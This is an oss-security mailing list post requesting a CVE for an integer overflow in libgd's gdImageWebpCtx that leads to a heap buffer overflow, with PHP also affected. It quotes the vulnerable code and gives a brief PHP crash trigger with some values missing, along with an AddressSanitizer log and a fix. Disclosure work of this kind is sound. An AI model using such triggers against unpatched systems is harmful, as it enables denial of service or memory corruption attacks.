  oss-security - CVE Request: libgd: Integer overflow in function gdImageWebpCtx of  gd_webp.c            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 27 Sep From: winsonliu(刘科) <winsonliu@...cent.com> To: oss-security <oss-security@...ts.openwall.com> CC: cve-assign <cve-assign@...re.org> Subject: CVE Request: libgd: Integer overflow in function gdImageWebpCtx of  gd_webp.c  Hello,  This is Ke Liu of Tencent's Xuanwu LAB. I reported an integer overflow vulnerability to libgd last month, the vulnerability could lead to heap buffer overflow circumstance and PHP was also affected. Now both libgd and PHP have been fixed this issue. Could you please assign a CVE number for it? Thanks.  Regards, Ke  DESCRIPTION ====================== An integer overflow vulnerability was found in function gdImageWebpCtx of file gd_webp.c in libgd. It could lead to heap buffer overflow circumstance. Both PHP and libgd were affected by this issue.   AFFECTED VENDORS ====================== PHP reported via PHP fixed via libgd reported via libgd fixed via   CREDIT ====================== This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.   VULNERABILITY DETAILS ====================== The bad code lies in function gdImageWebpCtx of file gd_webp.c.  argb = (uint8_t *)gdMalloc(gdImageSX(im) * 4 * gdImageSY(im));  /* integer overflow!!! */  There is no overflow check before calling the gdMalloc function. Actually, an integer overflow can be happened here. For example, * * 4 = -> Overflow -> The buffer will be overflowed in the following for loop.  for (y = 0; y < gdImageSY(im); y++) {     for (x = 0; x < gdImageSX(im); x++) {         register int c;         register char a;         c = im->tpixels[y][x];         a = gdTrueColorGetAlpha(c);         if (a == {             a = 0;         } else {             a = - ((a << 1) + (a >> 6));         }         *(p++) = gdTrueColorGetRed(c);    // heap buffer overflow!!!         *(p++) = gdTrueColorGetGreen(c);  // heap buffer overflow!!!         *(p++) = gdTrueColorGetBlue(c);   // heap buffer overflow!!!         *(p++) = a;    // heap buffer overflow!!!     } }   POC ====================== This issue was reported to PHP originally. So currently the proof-of-concept file is only available for PHP. But I think it's not hard to write a PoC for libgd.  <?php     ini_set('memory_limit', -1);     $im =     imagewebp($im, 'php.webp');     imagedestroy($im); ?>   EXCEPTION LOG ====================== Also, the exception log was generated by PHP.  AddressSanitizer: heap-buffer-overflow on address at pc bp sp WRITE of size 1 at thread T0     #0 in gdImageWebpCtx     #1 in _php_image_output_ctx     #2 in zif_imagewebp     #3 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER     #4 in execute_ex     #5 in zend_execute     #6 in zend_execute_scripts     #7 in php_execute_script     #8 in do_cli     #9 in main     #10 in __libc_start_main     #11 in _start ??:0:0  is located 0 bytes to the right of region allocated by thread T0 here:     #0 in malloc ??:0:0     #1 in _emalloc     #2 in gdImageWebpCtx     #3 in _php_image_output_ctx     #4 in zif_imagewebp     #5 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER     #6 in execute_ex     #7 in zend_execute     #8 in zend_execute_scripts     #9 in php_execute_script     #10 in do_cli     #11 in main     #12 in __libc_start_main  SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address:   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb   PATCH ====================== It's very easy to write a patch for this issue. Just call function overflow2 to check if overflow exists or not before calling function gdMalloc.  if (overflow2(gdImageSX(im), 4)) {     return; }  if (overflow2(gdImageSX(im) * 4, gdImageSY(im))) {     return; }   TIMELINE ====================== - Report to PHP as BUG - Wrote a patch and created a pull request for libgd - Wrote a patch and created a pull request for php-src - Fixed in PHP via and - Fixed in libgd via  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      